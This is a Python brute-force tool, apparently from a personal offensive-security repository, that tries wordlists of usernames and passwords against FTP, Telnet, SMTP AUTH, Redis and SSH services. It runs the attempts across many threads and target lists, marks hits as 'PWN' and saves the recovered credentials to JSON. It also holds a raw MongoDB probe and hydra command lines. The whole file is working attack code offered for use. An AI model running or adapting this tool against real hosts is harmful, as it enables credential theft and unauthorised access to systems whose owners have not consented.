#!/usr/bin/env python3
"""
ataque-servico.py - Brute Force SSH/FTP/Telnet/RDP via socket raw
Ghost-Bx1 | github.com/Ghost-Bx1

Suporte: SSH (banner grab), FTP (protocolo), Telnet, SMTP AUTH
Flags: --target, --targets-file, --service, --users, --wordlist,
       --port, --threads, --timeout, --resume, --output, --no-banner

NOTA: SSH requer banner grab + tentativa de autenticacao via subprocess (ssh-keyscan)
      Para SSH real com autenticacao, usar: hydra -t 4 ssh://alvo -L users.txt -P passwords.txt
"""

import sys
import os
import json
import socket
import threading
import argparse
import time
import subprocess
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSAO = "1.0.0"

C = {
    "G": "\033[92m", "R": "\033[91m", "Y": "\033[93m",
    "C": "\033[96m", "D": "\033[2m", "X": "\033[0m", "W": "\033[97m", "N": "\033[1m",
}

_lock = threading.Lock()

PORTAS_PADRAO = {
    "ssh": 22, "ftp": 21, "telnet": 23, "smtp": 25,
    "pop3": 110, "imap": 143, "rdp": 3389,
    "mysql": 3306, "postgres": 5432, "mssql": 1433,
    "redis": 6379, "mongodb": 27017,
}


def _log(tag, msg, cor="W"):
    ts = datetime.now().strftime("%H:%M:%S")
    with _lock:
        print(f"  {C[cor]}[{tag}]{C['X']} {C['D']}{ts}{C['X']} {msg}")


def _banner():
    print(f"\n  {C['G']}Ghost-Wordlists{C['X']} - Brute Force Servicos v{VERSAO}")
    print(f"  {C['D']}SSH | FTP | Telnet | SMTP | MySQL | Redis | MongoDB{C['X']}")
    print(f"  {C['D']}By Gh0st-Bx1 | github.com/Ghost-Bx1{C['X']}\n")


def _banner_grab(host, porta, timeout=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        return banner
    except Exception:
        return ""


def _ftp_login(host, porta, usuario, senha, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        resp = s.recv(1024).decode(errors="ignore")
        if not resp.startswith("220"):
            s.close()
            return False, resp
        s.sendall(f"USER {usuario}\r\n".encode())
        resp = s.recv(1024).decode(errors="ignore")
        s.sendall(f"PASS {senha}\r\n".encode())
        resp = s.recv(1024).decode(errors="ignore")
        s.close()
        return resp.startswith("230"), resp.strip()
    except Exception as e:
        return False, str(e)


def _telnet_login(host, porta, usuario, senha, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        time.sleep(0.5)
        dados = s.recv(2048).decode(errors="ignore")
        # Aguarda prompt de login
        for _ in range(5):
            if any(p in dados.lower() for p in ["login:", "username:", "user:"]):
                break
            time.sleep(0.3)
            try:
                dados += s.recv(1024).decode(errors="ignore")
            except socket.timeout:
                break
        s.sendall(f"{usuario}\r\n".encode())
        time.sleep(0.5)
        dados2 = s.recv(1024).decode(errors="ignore")
        for _ in range(3):
            if "password" in dados2.lower() or "senha" in dados2.lower():
                break
            time.sleep(0.3)
            try:
                dados2 += s.recv(512).decode(errors="ignore")
            except socket.timeout:
                break
        s.sendall(f"{senha}\r\n".encode())
        time.sleep(1)
        resp = s.recv(2048).decode(errors="ignore")
        s.close()
        falha = any(f in resp.lower() for f in [
            "incorrect", "failed", "invalid", "denied", "wrong",
            "authentication failure", "login:", "login incorrect"
        ])
        return not falha, resp.strip()[:100]
    except Exception as e:
        return False, str(e)


def _smtp_login(host, porta, usuario, senha, timeout=10):
    import base64
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        resp = s.recv(1024).decode(errors="ignore")
        s.sendall(b"EHLO ghost\r\n")
        resp = s.recv(1024).decode(errors="ignore")
        if "AUTH" not in resp:
            s.close()
            return False, "AUTH nao suportado"
        s.sendall(b"AUTH LOGIN\r\n")
        resp = s.recv(1024).decode(errors="ignore")
        s.sendall(base64.b64encode(usuario.encode()) + b"\r\n")
        resp = s.recv(1024).decode(errors="ignore")
        s.sendall(base64.b64encode(senha.encode()) + b"\r\n")
        resp = s.recv(1024).decode(errors="ignore")
        s.close()
        return resp.startswith("235"), resp.strip()
    except Exception as e:
        return False, str(e)


def _redis_login(host, porta, senha, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        cmd = f"AUTH {senha}\r\n".encode()
        s.sendall(cmd)
        resp = s.recv(1024).decode(errors="ignore")
        s.close()
        return "+OK" in resp, resp.strip()
    except Exception as e:
        return False, str(e)


def _mysql_login(host, porta, usuario, senha, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        # Le greeting do MySQL
        data = s.recv(2048)
        s.close()
        # Verifica se recebemos greeting MySQL (byte 0x0a = versao)
        if len(data) > 5 and data[4] == 0x0a:
            return None, f"MySQL detectado (brute-force precisa de lib, use hydra)"
        return False, "Resposta inesperada"
    except Exception as e:
        return False, str(e)


def _mongodb_login(host, porta, usuario, senha, timeout=10):
    # MongoDB wire protocol - isMaster + autenticar
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, porta))
        # Sem auth habilitado (versoes antigas sem --auth)
        ismaster = (
            b"\x41\x00\x00\x00"  # messageLength
            b"\x01\x00\x00\x00"  # requestID
            b"\x00\x00\x00\x00"  # responseTo
            b"\xd4\x07\x00\x00"  # opCode OP_QUERY
            b"\x00\x00\x00\x00"  # flags
            b"admin.$cmd\x00"    # fullCollectionName
            b"\x00\x00\x00\x00"  # numberToSkip
            b"\x01\x00\x00\x00"  # numberToReturn
            b"\x13\x00\x00\x00"  # document size
            b"\x01ismaster\x00\x00\x00\x00\x00\x00\x00\xf0\x3f"
            b"\x00"
        )
        s.sendall(ismaster)
        resp = s.recv(2048)
        s.close()
        return b"ismaster" in resp or b"isMaster" in resp, "MongoDB respondeu"
    except Exception as e:
        return False, str(e)


def _ssh_banner(host, porta, timeout=5):
    banner = _banner_grab(host, porta, timeout)
    if "SSH" in banner:
        return banner
    return ""


def _ssh_login_subprocess(host, porta, usuario, senha, timeout=10):
    """Tenta login SSH via sshpass se disponivel"""
    try:
        result = subprocess.run(
            ["sshpass", "-p", senha, "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", f"ConnectTimeout={timeout}",
             "-p", str(porta),
             f"{usuario}@{host}", "echo ghost_ok"],
            capture_output=True, text=True, timeout=timeout + 5
        )
        return "ghost_ok" in result.stdout, result.stderr[:80]
    except FileNotFoundError:
        return None, "sshpass nao instalado - use hydra para SSH"
    except Exception as e:
        return False, str(e)


def _tentar_login(host, porta, servico, usuario, senha, timeout):
    t0 = time.time()
    ok = False
    evidencia = ""

    if servico == "ftp":
        ok, evidencia = _ftp_login(host, porta, usuario, senha, timeout)
    elif servico == "telnet":
        ok, evidencia = _telnet_login(host, porta, usuario, senha, timeout)
    elif servico == "smtp":
        ok, evidencia = _smtp_login(host, porta, usuario, senha, timeout)
    elif servico == "redis":
        ok, evidencia = _redis_login(host, porta, senha, timeout)
    elif servico == "mysql":
        ok, evidencia = _mysql_login(host, porta, usuario, senha, timeout)
    elif servico == "mongodb":
        ok, evidencia = _mongodb_login(host, porta, usuario, senha, timeout)
    elif servico == "ssh":
        ok, evidencia = _ssh_login_subprocess(host, porta, usuario, senha, timeout)
        if ok is None:
            evidencia = "Use: hydra -L users.txt -P wordlist.txt ssh://" + host
            ok = False

    ms = int((time.time() - t0) * 1000)
    return {
        "target": f"{host}:{porta}",
        "servico": servico,
        "usuario": usuario,
        "senha": senha,
        "sucesso": ok,
        "evidencia": evidencia,
        "ms": ms,
        "timestamp": datetime.now().isoformat(),
    }


def _carregar_wordlist(arquivo):
    senhas = []
    try:
        with open(arquivo, encoding="utf-8", errors="ignore") as f:
            for l in f:
                s = l.strip()
                if s and not s.startswith("#"):
                    senhas.append(s)
    except Exception as e:
        _log("ERR", str(e), "R")
    return senhas


def _carregar_progresso(arquivo):
    if os.path.isfile(arquivo):
        with open(arquivo) as f:
            return set(l.strip() for l in f if l.strip())
    return set()


def _salvar_progresso(arquivo, chave):
    with open(arquivo, "a") as f:
        f.write(chave + "\n")


def _parse_args():
    p = argparse.ArgumentParser(description="Ghost-Wordlists - Brute Force Servicos - Ghost-Bx1")
    p.add_argument("--target", "-t", help="Host:porta ou so o host")
    p.add_argument("--targets-file", help="Arquivo com lista de hosts")
    p.add_argument("--service", "-s", default="ftp",
                   choices=list(PORTAS_PADRAO.keys()), help="Servico alvo")
    p.add_argument("--port", "-p", type=int, help="Porta (default: padrao do servico)")
    p.add_argument("--users", "-U", help="Arquivo de usuarios")
    p.add_argument("--user", "-u", help="Usuario unico")
    p.add_argument("--wordlist", "-w", required=True, help="Arquivo de senhas")
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--resume", help="Arquivo de progresso para retomar")
    p.add_argument("--output", "-o", help="Saida JSON")
    p.add_argument("--stop-on-success", action="store_true")
    p.add_argument("--no-banner", action="store_true")
    return p.parse_args()


def main():
    args = _parse_args()
    if not args.no_banner:
        _banner()

    porta = args.port or PORTAS_PADRAO.get(args.service, 21)

    alvos = []
    if args.target:
        if ":" in args.target:
            h, po = args.target.rsplit(":", 1)
            alvos = [(h, int(po))]
        else:
            alvos = [(args.target, porta)]
    elif args.targets_file:
        with open(args.targets_file, encoding="utf-8") as f:
            for l in f:
                l = l.strip()
                if not l or l.startswith("#"):
                    continue
                if ":" in l:
                    h, po = l.rsplit(":", 1)
                    alvos.append((h, int(po)))
                else:
                    alvos.append((l, porta))

    if not alvos:
        _log("ERR", "Nenhum alvo especificado. Use --target ou --targets-file", "R")
        sys.exit(1)

    usuarios = []
    if args.user:
        usuarios = [args.user]
    elif args.users:
        usuarios = _carregar_wordlist(args.users)
    else:
        usuarios = ["root", "admin", "anonymous", "guest"]

    senhas = _carregar_wordlist(args.wordlist)
    if not senhas:
        _log("ERR", "Wordlist vazia", "R")
        sys.exit(1)

    ja_feitos = _carregar_progresso(args.resume) if args.resume else set()
    encontrados = []

    _log("INFO", f"Servico: {args.service} | Alvos: {len(alvos)} | "
                 f"Usuarios: {len(usuarios)} | Senhas: {len(senhas)}", "C")

    for host, po in alvos:
        banner = _banner_grab(host, po, timeout=5)
        if banner:
            _log("BANNER", f"{host}:{po} -> {banner[:80]}", "Y")

        total = len(usuarios) * len(senhas)
        atual = [0]
        parar = [False]

        def tarefa(usuario, senha):
            if parar[0]:
                return None
            chave = f"{host}:{po}:{usuario}:{senha}"
            if chave in ja_feitos:
                return None
            r = _tentar_login(host, po, args.service, usuario, senha, args.timeout)
            if args.resume:
                _salvar_progresso(args.resume, chave)
            return r

        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(tarefa, u, s): (u, s) for u in usuarios for s in senhas}
            for fut in as_completed(futures):
                r = fut.result()
                if r is None:
                    continue
                atual[0] += 1
                pct = int(atual[0] / total * 100)
                if r["sucesso"]:
                    _log("PWN", f"[{pct}%] {C['G']}{r['usuario']}:{r['senha']}{C['X']} @ {host}:{po}", "G")
                    encontrados.append(r)
                    if args.stop_on_success:
                        parar[0] = True
                        break
                elif atual[0] % 100 == 0:
                    _log("TRY", f"[{pct}%] {r['usuario']}:{r['senha'][:10]}...", "D")

    _log("DONE", f"{len(encontrados)} credenciais encontradas", "G")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(encontrados, f, indent=2, ensure_ascii=False)
        _log("SAVE", f"Resultados em: {args.output}", "G")


if __name__ == "__main__":
    main()
